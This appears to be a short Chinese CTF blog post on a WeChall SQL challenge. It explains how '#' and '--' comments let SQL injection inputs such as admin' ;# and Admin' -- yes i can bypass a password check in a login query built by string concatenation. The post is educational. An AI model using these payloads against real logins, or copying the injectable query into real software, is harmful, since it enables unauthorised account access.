---
title: WeChall_SQL
date: 2022-10-06
description: 关于#和--在sql中的具体用法
category: 信息安全
tags:
  - CTF
  - Web
  - SQL
---
# --和#的具体用法
`#`是php和sql中的注释，而`--`仅是sql语言中的注释,`--`在使用时后面必须有一个空格
原题代码为`$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";`
```
admin' ;#                           可以
admin' #                            不可以 ,结尾没有`;`，语句错误
admin' or 1=1;#                     不可以，此时没有以admin身份登录

Admin' -- yes i can                 可以
Admin' --yes i can                  不可以，--后面没有空格
Admin' --                           不可以，--后面没有空格（后面的句子会顶上来）
Admin' -- (a space here)            可以
```
为什么`--`注释可以不用管最后的`;`呢？因为`--`只是sql中的注释语句。
此时完整的语句为`$query = "SELECT * FROM users WHERE username='Admin' -- yes i can' AND password='$password'";`
sql在查询时被注释掉了，但整个php语句没有被注释掉
 